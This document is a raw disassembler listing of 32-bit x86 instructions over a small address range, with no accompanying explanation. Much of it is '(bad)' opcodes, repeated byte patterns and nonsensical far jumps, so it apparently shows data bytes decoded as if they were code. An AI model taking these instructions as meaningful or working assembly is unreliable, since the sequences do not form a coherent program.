  4484c4:	bound  ecx,QWORD PTR [edx]
  4484c6:	popf   
  4484c7:	inc    eax
  4484c8:	bound  edx,QWORD PTR [esi]
  4484ca:	popf   
  4484cb:	inc    eax
  4484cc:	bound  esp,QWORD PTR [edx-0x419dbf64]
  4484d2:	pushf  
  4484d3:	inc    eax
  4484d4:	bound  edi,QWORD PTR [edx-0x399dbf64]
  4484da:	pushf  
  4484db:	inc    eax
  4484dc:	(bad)
  4484e1:	out    dx,al
  4484e2:	pushf  
  4484e3:	inc    eax
  4484e4:	(bad)  
  4484e5:	jmp    0x2:0x7262409c
  4484ec:	bound  esi,QWORD PTR [edx+0x2]
  4484ef:	add    BYTE PTR [edx-0x27],ah
  4484f2:	out    0x3,eax
  4484f4:	(bad)  
  4484f5:	(bad)  
  4484f7:	add    esp,DWORD PTR [edx-0x27]
  4484fa:	out    0x3,eax
  4484fc:	add    BYTE PTR [edx-0x27],ah
  4484ff:	out    0x3,eax
  448501:	(bad)  
  448502:	(bad)  
  448504:	add    esp,DWORD PTR [edx-0x27]
  448507:	out    0x3,eax
  448509:	(bad)  
  44850a:	(bad)  
  44850c:	add    esp,DWORD PTR [edx-0x27]
  44850f:	out    0x3,eax
  448511:	(bad)  
  448512:	(bad)  
  448514:	add    esp,DWORD PTR [edx-0x27]
  448517:	out    0x3,eax
  448519:	(bad)  
  44851a:	(bad)  
  44851c:	add    esp,DWORD PTR [edx-0x27]
  44851f:	out    0x3,eax
  448521:	(bad)  
  448522:	(bad)  
  448524:	add    esp,DWORD PTR [edx-0x27]
  448527:	out    0x3,eax
  448529:	(bad)  
  44852a:	(bad)  
  44852c:	add    esp,DWORD PTR [edx-0x27]
  44852f:	out    0x3,eax
  448531:	(bad)  
  448532:	(bad)  
  448534:	add    esp,DWORD PTR [edx-0x27]
  448537:	out    0x3,eax
  448539:	(bad)  
  44853a:	(bad)  
  44853c:	add    esp,DWORD PTR [edx-0x27]
  44853f:	out    0x3,eax
  448541:	(bad)  
  448542:	(bad)  
  448544:	add    esp,DWORD PTR [edx-0x27]
  448547:	out    0x3,eax
  448549:	(bad)  
  44854a:	(bad)  
  44854c:	add    esp,DWORD PTR [edx-0x27]
  44854f:	out    0x3,eax
  448551:	(bad)  
  448552:	(bad)  
  448554:	add    esp,DWORD PTR [edx-0x27]
  448557:	out    0x3,eax
  448559:	(bad)  
  44855a:	(bad)  
  44855c:	add    esp,DWORD PTR [edx-0x27]
  44855f:	out    0x3,eax
  448561:	add    BYTE PTR [edx-0x27],ah
  448564:	out    0x3,eax
  448566:	(bad)  
  448567:	(bad)  
  448569:	add    esp,DWORD PTR [edx-0x27]
  44856c:	add    cl,ch
  44856e:	popa   
  44856f:	fld    DWORD PTR [eax]
  448571:	jmp    0xe9455ed7
  448576:	popa   
  448577:	fld    DWORD PTR [eax]
  448579:	jmp    0xe9455edf
  44857e:	popa   
  44857f:	fld    DWORD PTR [eax]
  448581:	jmp    0xe9455ee7
  448586:	popa   
  448587:	fld    DWORD PTR [eax]
  448589:	jmp    0xe9455eef
  44858e:	popa   
  44858f:	fld    DWORD PTR [eax]
  448591:	jmp    0xe9455ef7
  448596:	popa   
  448597:	fld    DWORD PTR [eax]
  448599:	jmp    0xe9455eff
  44859e:	popa   
  44859f:	fld    DWORD PTR [eax]
  4485a1:	jmp    0xe9455f07
  4485a6:	popa   
  4485a7:	fld    DWORD PTR [eax]
  4485a9:	jmp    0xe9455f0f
  4485ae:	popa   
  4485af:	fld    DWORD PTR [eax]
  4485b1:	jmp    0xe9455f17
  4485b6:	popa   
  4485b7:	fld    DWORD PTR [eax]
  4485b9:	jmp    0xe9455f1f
  4485be:	popa   
  4485bf:	fld    DWORD PTR [eax]
  4485c1:	jmp    0xe9455f27
  4485c6:	add    BYTE PTR [ecx-0x27],ah
  4485c9:	add    cl,ch
  4485cb:	popa   
  4485cc:	fld    DWORD PTR [eax]
  4485ce:	jmp    0xe9455f34
  4485d3:	popa   
  4485d4:	fld    DWORD PTR [eax]
  4485d6:	jmp    0xe9455f3c
  4485db:	popa   
  4485dc:	fld    DWORD PTR [eax]
  4485de:	jmp    0xe9455f44
  4485e3:	popa   
  4485e4:	fld    DWORD PTR [eax]
  4485e6:	add    bl,cl
  4485e8:	fiadd  DWORD PTR [eax]
  4485ea:	add    BYTE PTR [ebx-0x44ffff26],bh
  4485f0:	fiadd  DWORD PTR [eax]
  4485f2:	add    BYTE PTR [ebx-0x74ffff26],cl
  4485f8:	fiadd  DWORD PTR [eax]
  4485fa:	add    BYTE PTR [ebx-0x26],bh
  4485fd:	add    BYTE PTR [eax],al
  4485ff:	jnp    0x4485db
  448601:	add    BYTE PTR [eax],al
  448603:	mov    ebx,edx
  448605:	add    BYTE PTR [eax],al
  448607:	mov    ebx,edx
  448609:	add    BYTE PTR [eax],al
  44860b:	jnp    0x4485e7
  44860d:	add    BYTE PTR [eax],al
  44860f:	jnp    0x4485eb
  448611:	add    BYTE PTR [eax],al
  448613:	dec    ebx
  448614:	fiadd  DWORD PTR [eax]
  448616:	add    BYTE PTR [ebx-0x26],cl
  448619:	add    BYTE PTR [eax],al
  44861b:	cmp    ebx,edx
  44861d:	add    BYTE PTR [eax],al
  44861f:	cmp    ebx,edx
  448621:	add    BYTE PTR [eax],al
  448623:	dec    ebx
  448624:	fiadd  DWORD PTR [eax]
  448626:	add    BYTE PTR [ebx-0x26],cl
  448629:	add    BYTE PTR [eax],al
  44862b:	add    BYTE PTR [ebx],bh
  44862d:	fiadd  DWORD PTR [eax]
  44862f:	add    BYTE PTR [ebx],bh
  448631:	fiadd  DWORD PTR [eax]
  448633:	add    BYTE PTR [ebx],cl
  448635:	fiadd  DWORD PTR [eax]
  448637:	add    BYTE PTR [ebx],cl
  448639:	fiadd  DWORD PTR [eax]
  44863b:	add    bl,bh
  44863d:	fld    DWORD PTR [eax]
  44863f:	add    bl,bh
  448641:	fld    DWORD PTR [eax]
  448643:	add    BYTE PTR [ebx],cl
  448645:	fiadd  DWORD PTR [eax]
  448647:	add    BYTE PTR [ebx],cl
  448649:	fiadd  DWORD PTR [eax]
  44864b:	add    bl,bh
  44864d:	fld    DWORD PTR [eax]
  44864f:	add    bl,bh
  448651:	fld    DWORD PTR [eax]
  448653:	add    bl,cl
  448655:	fld    DWORD PTR [eax]
  448657:	add    bl,cl
  448659:	fld    DWORD PTR [eax]
  44865b:	add    BYTE PTR [ebx+0x620000d9],bh
  448661:	jo     0x448665
  448663:	add    BYTE PTR [edx+0x70],ah
  448666:	add    al,BYTE PTR [eax]
  448668:	bound  esi,QWORD PTR [eax+0x2]
  44866b:	add    BYTE PTR [edx+0x70],ah
  44866e:	add    al,BYTE PTR [eax]
  448670:	bound  esi,QWORD PTR [eax+0x2]
  448673:	add    BYTE PTR [edx+0x70],ah
  448676:	add    al,BYTE PTR [eax]
  448678:	bound  esi,QWORD PTR [eax+0x2]
  44867b:	add    BYTE PTR [edx+0x70],ah
  44867e:	add    al,BYTE PTR [eax]
  448680:	bound  esi,QWORD PTR [eax+0x2]
  448683:	add    BYTE PTR [edx+0x70],ah
  448686:	add    al,BYTE PTR [eax]
  448688:	bound  esi,QWORD PTR [eax+0x2]
  44868b:	add    BYTE PTR [edx+0x70],ah
  44868e:	add    al,BYTE PTR [eax]
  448690:	add    BYTE PTR [edx+0x70],ah
  448693:	add    al,BYTE PTR [eax]
  448695:	bound  esi,QWORD PTR [edx+0x2]
  448698:	add    BYTE PTR [edx+0x72],ah
  44869b:	add    al,BYTE PTR [eax]
  44869d:	bound  esi,QWORD PTR [edx+0x2]
  4486a0:	add    BYTE PTR [edx+0x72],ah
  4486a3:	repnz (bad) 
  4486a5:	cmp    eax,0x6200026f
  4486aa:	sbb    cl,BYTE PTR [ebx]
  4486ac:	mov    esp,0xd40ac26b
  4486b1:	imul   ebx,edx,0xa
  4486b4:	in     al,dx
  4486b5:	pop    ebx
  4486b6:	jb     0x4486bc
  4486b8:	add    al,0x58
  4486ba:	fimul  DWORD PTR [edx]
  4486bc:	sbb    al,0x48
  4486be:	jb     0x448682
  4486c0:	inc    DWORD PTR ds:0x6200026b
  4486c6:	mov    dh,0xfe
  4486c8:	inc    edi
  4486c9:	xor    al,0x36
  4486cb:	(bad)  
  4486cc:	fld    TBYTE PTR ds:0x25ebfe8e
  4486d2:	es (bad) 
  4486d4:	jmp    DWORD PTR [edx+0x72]
  4486d7:	mov    dl,0xff
  4486d9:	aad    0xd9
  4486db:	xchg   ebx,eax
  4486dc:	add    esp,DWORD PTR [edx-0x27]
  4486df:	fist   DWORD PTR [ebx]
  4486e1:	pop    esi
  4486e2:	test   eax,0xa95613f3
  4486e7:	mov    ebx,0xb3a97e13
  4486ec:	adc    esi,DWORD PTR [esi-0x57]
  4486ef:	sbb    edx,DWORD PTR [esi+ebx*1]
  4486f2:	test   eax,0x36001413
  4486f7:	test   eax,0xa8fe13fb
  4486fc:	rcl    DWORD PTR [ebx],cl
  4486fe:	push   ss
  4486ff:	test   eax,0xa9de145b
  448704:	jae    0x44871a
  448706:	(bad)  
  448707:	test   eax,0xa9be147b
  44870c:	jae    0x448722
  44870e:	mov    dh,0xa9
  448710:	sbb    edx,DWORD PTR [esi+ebx*4]
  448713:	test   eax,0xa9361413
  448718:	cmp    edx,DWORD PTR [esi+edi*1]
  44871b:	test   eax,0xa9561413
  448720:	fist   DWORD PTR [esi+ebx*2]
  448723:	stos   BYTE PTR es:[edi],al
  448724:	repz adc al,0x56
  448727:	stos   BYTE PTR es:[edi],al
  448728:	mov    ebx,0xb3aa7e14
  44872d:	adc    al,0x76
  44872f:	stos   BYTE PTR es:[edi],al
  448730:	fwait
  448731:	adc    al,0x9e
  448733:	stos   BYTE PTR es:[edi],al
  448734:	xchg   ebx,eax
  448735:	adc    al,0xb6
  448737:	stos   BYTE PTR es:[edi],al
  448738:	jnp    0x44874e
  44873a:	jle    0x4486e6
  44873c:	push   ebx
  44873d:	adc    eax,0x145baa96
  448742:	fisubr WORD PTR [ecx-0x5629eb8d]
  448748:	jnp    0x44875e
  44874a:	mov    esi,0xb61473a9
  44874f:	test   eax,0xaa1e149b
  448754:	add    BYTE PTR [ebp-0x3acf7a8a],bl
  44875a:	add    BYTE PTR [esi+0x75],ch
  44875d:	xor    BYTE PTR [ebp-0x1acf9a8a],bl
  448763:	jae    0x44873a
  448765:	xor    bh,ch
  448767:	push   ebx
  448768:	lds    esi,FWORD PTR [edx]
  44876a:	lds    edx,FWORD PTR [ebx-0x4b]
  44876d:	xor    bh,BYTE PTR [ebp+0x2532a553]
  448773:	push   eax
  448774:	adc    eax,0x5701d33
  448779:	xor    eax,DWORD PTR ds:0xdd32f570
  44877f:	jae    0x448766
  448781:	xor    ah,BYTE PTR [ebp+0x73]
  448784:	push   ebp
  448785:	xor    edi,DWORD PTR [ebp+0x53]
  448788:	inc    ebp
  448789:	xor    eax,DWORD PTR [ebp+0x7d333553]
  44878f:	push   ebx
  448790:	and    eax,0x95532533
  448795:	xor    ebx,DWORD PTR ds:0x45338573
  44879b:	jae    0x448812
  44879d:	xor    ebx,DWORD PTR ds:0xe5336573
  4487a3:	jo     0x44877a
  4487a5:	xor    ebp,edi
  4487a7:	push   eax
  4487a8:	lds    esi,FWORD PTR [ecx]
  4487aa:	lds    edx,FWORD PTR [eax-0x4b]
  4487ad:	xor    DWORD PTR [ebp-0x5ace5ab0],edi
  4487b3:	push   eax
  4487b4:	adc    eax,0x5709d32
  4487b9:	xor    al,BYTE PTR [ebp+0x5d31f570]
  4487bf:	add    BYTE PTR [ebx-0x1b],dh
  4487c2:	xor    DWORD PTR [ebp+0x73],esp
  4487c5:	push   ebp
  4487c6:	xor    bh,BYTE PTR [ebp+0x53]
  4487c9:	inc    ebp
  4487ca:	xor    al,BYTE PTR [ebp+0x323553]
  4487d0:	outs   dx,DWORD PTR ds:[esi]
  4487d1:	enter  0x33ac,0xbf
  4487d5:	enter  0x33bc,0xff
  4487d9:	enter  0x33cc,0x9f
  4487dd:	enter  0x33dc,0xef
  4487e1:	enter  0x33ec,0xbf
  4487e5:	retf   0x33fc
  4487e8:	mov    edi,0x9f340cca
  4487ed:	retf   0x341c
  4487f0:	out    dx,eax
  4487f1:	retf   0x342c
  4487f4:	jg     0x4487bf
  4487f6:	cmp    al,0x34
  4487f8:	jg     0x4487c3
  4487fa:	dec    esp
  4487fb:	xor    al,0x5f
  4487fd:	leave  
  4487fe:	pop    esp
  4487ff:	xor    al,0xaf
  448801:	retf   0x346c
  448804:	dec    eax
  448806:	jl     0x44883c
  448808:	dec    eax
  44880a:	mov    WORD PTR [edi+ebx*8],?
  44880d:	leave  
  44880e:	pushf  
  44880f:	xor    al,0xef
  448811:	enter  0x34ac,0x3f
  448815:	leave  
  448816:	mov    esp,0xccc97f34
  44881b:	xor    al,0x9f
  44881d:	leave  
  44881e:	fdiv   QWORD PTR [edi+ebp*2]
  448821:	leave  
  448822:	in     al,dx
  448823:	xor    al,0x0
  448825:	aas    
  448826:	retf   
  448827:	cld    
  448828:	xor    al,0x3f
  44882a:	retf   
  44882b:	or     al,0x35
  44882d:	pop    ds
  44882e:	retf   
  44882f:	sbb    al,0x35
  448831:	out    dx,eax
  448832:	retf   0x352c
  448835:	dec    edx
  448837:	cmp    al,0x35
  448839:	dec    edx
  44883b:	dec    esp
  44883c:	xor    eax,0x355ccadf
  448841:	scas   eax,DWORD PTR es:[edi]
  448842:	retf   0x356c
  448845:	jg     0x448812
  448847:	jl     0x44887e
  448849:	(bad)  
  44884a:	fadd   QWORD PTR [esi]
  44884c:	xchg   esp,eax
  44884d:	das    
  44884e:	push   esp
  44884f:	pop    es
  448850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448851:	aaa    
  448852:	fadd   QWORD PTR [esi]
  448854:	mov    ah,0x2f
  448856:	xor    al,0x7
  448858:	les    edx,FWORD PTR [edi-0x702bf8c4]
  44885e:	xchg   esp,eax
  44885f:	pop    es
  448860:	in     al,0x97
  448862:	cmp    al,0x7
  448864:	hlt    
  448865:	(bad)  
  448866:	je     0x44886c
  448868:	add    al,0x74
  44886a:	pop    esp
  44886b:	add    al,0x14
  44886d:	ins    BYTE PTR es:[edi],dx
  44886e:	xchg   esp,eax
  44886f:	add    al,0x24
  448871:	je     0x44888f
  448873:	add    al,0x34
  448875:	ins    BYTE PTR es:[edi],dx
  448876:	mov    ah,0x6
  448878:	inc    esp
  448879:	push   esp
  44887a:	mov    esp,0xd44c5406
  44887f:	push   es
  448880:	fs push esp
  448882:	jl     0x448888
  448884:	je     0x4488d2
  448886:	hlt    
  448887:	add    eax,DWORD PTR [eax+eax*1-0x6bfc23cc]
  44888e:	sub    al,0x54
  448890:	add    al,0xa4
  448892:	xor    al,0xdc
  448894:	add    esi,DWORD PTR [esp+ebp*1-0x6b3bfc4c]
  44889b:	test   BYTE PTR [ebx],0xd4
  44889e:	mov    WORD PTR [esi-0x96b1bfd],ds
  4488a4:	add    esi,esp
  4488a6:	mov    WORD PTR [esi],?
  4488a8:	add    eax,0x5567504
  4488ad:	adc    al,0x6d
  4488af:	push   ds
  4488b0:	add    eax,0x5967524
  4488b5:	xor    al,0x6d
  4488b7:	jle    0x4488be
  4488b9:	inc    esp
  4488ba:	push   ebp
  4488bb:	jbe    0x4488c2
  4488bd:	push   esp
  4488be:	dec    ebp
  4488bf:	pop    esi
  4488c0:	add    eax,0x53d95564
  4488c5:	sti    
  4488c6:	xchg   ecx,eax
  4488c7:	adc    BYTE PTR [ebx+edi*8-0x1f],bl
  4488cb:	adc    BYTE PTR [eax-0x57ef3605],al
  4488d1:	sti    
  4488d2:	and    DWORD PTR [ecx],edx
  4488d4:	mov    al,ds:0xd41109fb
  4488d9:	sti    
  4488da:	jns    0x4488ed
  4488dc:	cld    
  4488dd:	sti    
  4488de:	mov    DWORD PTR [ecx],edx
  4488e0:	in     al,0xfb
  4488e2:	mov    DWORD PTR [ecx],edx
  4488e4:	sub    al,0xfc
  4488e6:	sbb    DWORD PTR [ecx],edx
  4488e8:	xor    al,0xfc
  4488ea:	sbb    DWORD PTR [ecx],edx
  4488ec:	cld    
  4488ed:	sti    
  4488ee:	add    BYTE PTR [ecx+0x11],cl
  4488f1:	add    al,0xfc
  4488f3:	sub    DWORD PTR [ecx],edx
  4488f5:	ins    BYTE PTR es:[edi],dx
  4488f6:	cld    
  4488f7:	fst    DWORD PTR [ecx]
  4488f9:	push   esp
  4488fa:	cld    
  4488fb:	stc    
  4488fc:	adc    DWORD PTR [esp+edi*8],edi
  4488ff:	leave  
  448900:	adc    DWORD PTR [esp+edi*8],esp
  448903:	leave  
  448904:	adc    DWORD PTR [esp+edi*8],ebp
  448907:	cdq    
  448908:	adc    DWORD PTR [esp+edi*8],esi
  44890b:	cdq    
  44890c:	adc    DWORD PTR [esp+edi*8],edi
  44890f:	mov    DWORD PTR [ecx],edx
  448911:	inc    esp
  448912:	cld    
  448913:	imul   edx,DWORD PTR [ecx],0x1259fcec
  448919:	aam    0xfc
  44891b:	jns    0x44892f
  44891d:	cld    
  44891e:	cld    
  44891f:	mov    DWORD PTR [edx],edx
  448921:	in     al,0xfc
  448923:	mov    DWORD PTR [edx],edx
  448925:	lods   al,BYTE PTR ds:[esi]
  448926:	cld    
  448927:	cdq    
  448928:	adc    dh,BYTE PTR [esp+edi*8-0x383ed67]
  44892f:	leave  
  448930:	adc    al,BYTE PTR [esp+edi*8-0x293ed57]
  448937:	fst    DWORD PTR [ecx]
  448939:	push   esp
  44893a:	std    
  44893b:	stc    
  44893c:	adc    DWORD PTR [ecx],eax
  44893e:	inc    ebp
  44893f:	pop    ss
  448940:	test   BYTE PTR [eax],bh
  448942:	sub    eax,0xb538940f
  448947:	push   es
  448948:	and    al,0x38
  44894a:	mov    ebp,0xc53833fe
  44894f:	test   BYTE PTR [ebx+0x38],0xcd
  448953:	add    dh,ch
  448955:	push   ebx
  448956:	cmp    ch,dh
  448958:	out    0xe3,eax
  44895a:	cmp    bl,ch
  44895c:	fcomip st,st(3)
  44895e:	cmp    al,BYTE PTR ds:0xed3b03d4
  448964:	iret   
  448965:	adc    edi,DWORD PTR [ebx]
  448967:	xor    eax,0x3d3aa3c4
  44896c:	mov    esp,0xb4053ab3
  448971:	ret    
  448972:	cmp    cl,BYTE PTR ds:0x753ad3ac
  448978:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448979:	arpl   WORD PTR [ebx],di
  44897b:	pop    ebp
  44897c:	lahf   
  44897d:	jae    0x4489ba
  44897f:	inc    ebp
  448980:	xchg   edi,eax
  448981:	cmp    DWORD PTR [ebx],0x2d
  448984:	(bad)  
  448985:	xchg   ebx,eax
  448986:	cmp    esi,DWORD PTR ds:0x3d3b2387
  44898c:	jg     0x4489c1
  44898e:	cmp    eax,DWORD PTR [ebp+0x77]
  448991:	inc    ebx
  448992:	cmp    ecx,DWORD PTR [ebp+0x6f]
  448995:	push   ebx
  448996:	cmp    esi,ebp
  448998:	fs jecxz 0x4489d4
  44899b:	fstp   QWORD PTR [ebx+esi*8+0x39]
  44899f:	add    eax,0xed3a0355
  4489a4:	dec    esp
  4489a5:	adc    edi,DWORD PTR [edx]
  4489a7:	mov    ch,0x44
  4489a9:	mov    ds:0xb33cbd39,eax
  4489ae:	cmp    DWORD PTR [ebp-0x72c63ccc],eax
  4489b4:	sub    al,0xd3
  4489b6:	cmp    DWORD PTR [eax],eax
  4489b8:	add    BYTE PTR [edi-0x40c475a9],ch
  4489be:	push   edi
  4489bf:	call   0x3f3b:0xaa579f3b
  4489c6:	push   edi
  4489c7:	mov    edx,0xca54cf3b
  4489cc:	cmp    edi,DWORD PTR [edi+0x1f3bda54]
  4489d2:	push   ebp
  4489d3:	jmp    0xef3b:0xfa551f3b
  4489da:	push   esi
  4489db:	or     bh,BYTE PTR [edi+edi*4]
  4489de:	push   esi
  4489df:	sbb    bh,BYTE PTR [edi+ebx*2]
  4489e2:	fldenv [esp+edi*1]
  4489e5:	mov    edi,0x8f3c3a56
  4489ea:	fld    DWORD PTR [esp+edi*1+0x7f]
  4489ee:	fst    DWORD PTR [esp+edi*1+0x5f]
  4489f2:	fldenv [esp+edi*1+0x5f]
  4489f6:	fnstenv [esp+edi*1+0x2f]
  4489fa:	fld    DWORD PTR [esp+edi*1+0x3c94d93f]
  448a01:	pop    ds
  448a02:	fldenv [esp+edi*1+0x3cb4d93f]
  448a09:	dec    edi
  448a0a:	fld    st(4)
  448a0c:	cmp    al,0x3f
  448a0e:	(bad)  
  448a10:	cmp    al,0x1f
  448a12:	ftst   
  448a14:	cmp    al,0x1f
  448a16:	fxtract 
  448a18:	cmp    al,0x6f
  448a1a:	push   edi
  448a1b:	or     bh,BYTE PTR ds:0x1a573f00
  448a21:	cmp    eax,0x3d2a565f
  448a26:	aas    
  448a27:	push   edi
  448a28:	cmp    bh,BYTE PTR ds:0x3d4a570f
  448a2e:	call   DWORD PTR [esi+0x5a]
  448a31:	cmp    eax,0x6bf75c62
  448a36:	outs   dx,DWORD PTR ds:[esi]
  448a37:	idiv   DWORD PTR fs:[ebx+0x67]
  448a3b:	int3   
  448a3c:	cmc    
  448a3d:	mov    ebx,DWORD PTR [edi-0x4c]
  448a40:	cmc    
  448a41:	fwait
  448a42:	push   edi
  448a43:	pushf  
  448a44:	cmc    
  448a45:	stos   DWORD PTR es:[edi],eax
  448a46:	dec    edi
  448a47:	add    al,0xf6
  448a49:	mov    ebx,0xcbf78c47
  448a4e:	aas    
  448a4f:	xchg   esp,eax
  448a50:	neg    ebx
  448a52:	aaa    
  448a53:	sbb    al,0xf7
  448a55:	jmp    0x448a86
  448a57:	and    al,0xf7
  448a59:	sti    
  448a5a:	daa    
  448a5b:	dec    esp
  448a5c:	add    BYTE PTR [esp+ebx*4],cl
  448a5f:	xor    al,0x0
  448a61:	sbb    al,0x94
  448a63:	fadd   QWORD PTR [edx]
  448a65:	sub    al,0x8c
  448a67:	inc    esp
  448a68:	add    BYTE PTR [esp+eax*4],bh
  448a6b:	or     al,0x3
  448a6d:	dec    esp
  448a6e:	jl     0x448a84
  448a70:	add    ebx,DWORD PTR [esp+esi*2-0x24]
  448a74:	add    ch,BYTE PTR [esp+ebp*2-0x1c]
  448a78:	add    bh,BYTE PTR [esp+eiz*2-0x34]
  448a7c:	dec    DWORD PTR [ebx-0x64004ba4]
  448a82:	add    BYTE PTR [esp+ebx*4-0x1],dl
  448a86:	stos   DWORD PTR es:[edi],eax
  448a87:	dec    esp
  448a88:	add    al,0x0
  448a8a:	mov    esp,0xcc000c44
  448a8f:	cmp    al,0x14
  448a91:	add    ah,bl
  448a93:	xor    al,0x9c
  448a95:	(bad)  
  448a96:	jmp    0x448ac4
  448a98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448a99:	(bad)  
  448a9a:	sti    
  448a9b:	and    al,0x4c
  448a9d:	add    DWORD PTR [ebx*4-0x6ae3feca],ecx
  448aa4:	fdivp  st(7),st
  448aa6:	sub    ecx,DWORD PTR [ebp-0x7ac3feba]
  448aac:	fldcw  WORD PTR [ebx-0x4beb5200]
  448ab2:	add    BYTE PTR [esi-0x41ff83ec],dl
  448ab8:	adc    al,0x84
  448aba:	add    BYTE PTR [esi-0x11ff93ec],ah
  448ac0:	adc    al,0x54
  448ac2:	add    dh,dh
  448ac4:	adc    al,0x3c
  448ac6:	add    BYTE PTR [esi-0x39ffdbec],bh
  448acc:	adc    al,0xac
  448ace:	jmp    FWORD PTR [ecx]
  448ad0:	adc    eax,0x1519ffb4
  448ad5:	mov    esp,0xc414f9ff
  448ada:	jmp    ebp
  448adc:	push   esp
  448add:	call   0xd8996885
  448ae2:	add    DWORD PTR [edx-0x27],esp
  448ae5:	jecxz  0x448ada
  448ae7:	add    BYTE PTR [ecx+0x9],ah
  448aea:	int3   
  448aeb:	repz imul ecx,DWORD PTR [edx],0xa89f4cc
  448af2:	aam    0xf4
  448af4:	jns    0x448b00
  448af6:	sbb    al,0xf5
  448af8:	sbb    DWORD PTR [edx],ecx
  448afa:	and    al,0xf5
  448afc:	or     DWORD PTR [edx],ecx
  448afe:	or     al,0xf5
  448b00:	or     DWORD PTR [edx],ecx
  448b02:	hlt    
  448b03:	hlt    
  448b04:	sbb    DWORD PTR [edx],ecx
  448b06:	pop    esp
  448b07:	cmc    
  448b08:	(bad)  [edx]
  448b0a:	inc    esp
  448b0b:	cmc    
  448b0c:	jmp    0xca3a171b
  448b11:	or     dl,BYTE PTR [ebp+esi*8-0xae3f547]
  448b18:	cdq    
  448b19:	or     ah,BYTE PTR [esi*8-0xab3f577]
  448b20:	dec    ecx
  448b21:	or     dh,BYTE PTR [esi*8-0x1afef5a7]
  448b28:	push   ebx
  448b29:	loopne 0x448b5d
  448b2b:	int    0x53
  448b2d:	lock xor dl,ch
  448b30:	xor    eax,DWORD PTR [eax]
  448b32:	xor    ebx,ebp
  448b34:	xor    edx,DWORD PTR [eax]
  448b36:	xor    esp,DWORD PTR [ebp-0x52cd5fcd]
  448b3c:	xor    esi,DWORD PTR [eax-0x3fec6ace]
  448b42:	xor    bh,BYTE PTR [ebp+0x13]
  448b45:	shl    BYTE PTR [edx],1
  448b47:	adc    BYTE PTR gs:[eax+0x33],ah
  448b4b:	dec    ebp
  448b4c:	add    BYTE PTR [eax],dl
  448b4e:	jo     0x448b83
  448b50:	xchg   ebp,eax
  448b51:	repz jg 0x448b87
  448b54:	popf   
  448b55:	repz (bad) 
  448b57:	xor    esp,DWORD PTR [ebp-0x52cce00d]
  448b5d:	repz das 
  448b5f:	xor    edx,ebp
  448b61:	sar    DWORD PTR [edi],cl
  448b63:	xor    edi,DWORD PTR [ebp-0x1accb02d]
  448b69:	rcr    bh,1
  448b6b:	xor    ebp,ecx
  448b6d:	shr    bh,1
  448b6f:	xor    ebp,edx
  448b71:	mov    al,0xff
  448b73:	xor    ebp,ebx
  448b75:	mov    al,0xf
  448b77:	xor    ah,BYTE PTR ds:0x2d319fb1
  448b7d:	mov    cl,0xaf
  448b7f:	xor    DWORD PTR ds:0xfd31bf91,edx
  448b85:	nop
  448b86:	iret   
  448b87:	xor    DWORD PTR [ebp-0x70],esp
  448b8a:	pop    edi
  448b8b:	xor    cl,BYTE PTR [ebp-0x70]
  448b8e:	outs   dx,DWORD PTR ds:[esi]
  448b8f:	xor    dl,BYTE PTR [ebp-0x62cd8090]
  448b95:	jo     0x448b26
  448b97:	xor    ah,BYTE PTR ds:0x2d321f70
  448b9d:	jo     0x448bce
  448b9f:	xor    al,BYTE PTR [eax]
  448ba1:	mov    bh,0x47
  448ba3:	jmp    0x4733:0xfa479733
  448baa:	dec    ebx
  448bab:	or     dh,BYTE PTR [edi+edx*1]
  448bae:	dec    ebx
  448baf:	sbb    dh,BYTE PTR [eax+eax*1]
  448bb2:	pop    ss
  448bb3:	dec    ebx
  448bb4:	sub    dh,BYTE PTR [edi+edx*1]
  448bb7:	dec    ebx
  448bb8:	cmp    dh,BYTE PTR [edi+eax*1]
  448bbb:	dec    ebx
  448bbc:	dec    edx
  448bbd:	xor    al,0xf7
  448bbf:	dec    edx
  448bc0:	pop    edx
  448bc1:	xor    al,0xf7
  448bc3:	dec    edx
  448bc4:	push   0x34
  448bc6:	xchg   edi,eax
  448bc7:	dec    edx
  448bc8:	jp     0x448bfe
  448bca:	xchg   DWORD PTR [edx-0x76],ecx
  448bcd:	xor    al,0x97
  448bcf:	dec    edx
  448bd0:	call   0xd734:0xaa51d734
  448bd7:	push   ecx
  448bd8:	mov    edx,0xca51c734
  448bdd:	xor    al,0xb7
  448bdf:	push   ecx
  448be0:	fidiv  DWORD PTR [edi+esi*4]
  448be3:	push   ecx
  448be4:	jmp    0xc734:0xfa521734
  448beb:	dec    ebx
  448bec:	or     dh,BYTE PTR ds:0x351a4b97
  448bf2:	xchg   edi,eax
  448bf3:	dec    ebx
  448bf4:	sub    dh,BYTE PTR ds:0x353a4b97
  448bfa:	xchg   DWORD PTR [edx+0x4a],ecx
  448bfd:	xor    eax,0x355a4a77
  448c02:	ja     0x448c4e
  448c04:	push   0x35
  448c06:	xchg   edi,eax
  448c07:	dec    ebx
  448c08:	jp     0x448c3f
  448c0a:	pop    es
  448c0b:	dec    edx
  448c0c:	mov    dh,BYTE PTR ds:0x359a4a17
  448c12:	xlat   BYTE PTR ds:[ebx]
  448c13:	dec    edx
  448c14:	stos   BYTE PTR es:[edi],al
  448c15:	xor    eax,0xba4ad700
  448c1a:	xor    eax,0xcbedfc62
  448c1f:	das    
  448c20:	add    al,0xee
  448c22:	fist   DWORD PTR [edi-0x70141254]
  448c28:	adc    al,0xee
  448c2a:	sti    
  448c2b:	xchg   edi,eax
  448c2c:	cmp    al,0xec
  448c2e:	or     ecx,DWORD PTR [esp+0x2c741bec]
  448c35:	in     al,dx
  448c36:	sub    ebp,DWORD PTR [esp+esi*1-0x14]
  448c3a:	cmp    esi,DWORD PTR [esp+edi*2-0x14]
  448c3e:	dec    ebx
  448c3f:	ins    BYTE PTR es:[edi],dx
  448c40:	test   ah,ch
  448c42:	pop    ebx
  448c43:	push   esp
  448c44:	ins    BYTE PTR es:[edi],dx
  448c45:	in     al,dx
  448c46:	imul   ecx,DWORD PTR [esp+edx*8-0x15],0x7b
  448c4b:	push   esp
  448c4c:	mov    esp,0xa44c8bee
  448c51:	out    dx,al
  448c52:	fwait
  448c53:	xor    al,0x6c
  448c55:	in     al,dx
  448c56:	stos   DWORD PTR es:[edi],eax
  448c57:	sub    al,0x74
  448c59:	in     al,dx
  448c5a:	mov    ebx,0xcbec7c34
  448c5f:	sub    al,0x84
  448c61:	in     al,dx
  448c62:	fist   DWORD PTR [esp+ebp*1-0x6b731414]
  448c69:	in     al,dx
  448c6a:	sti    
  448c6b:	xchg   esp,eax
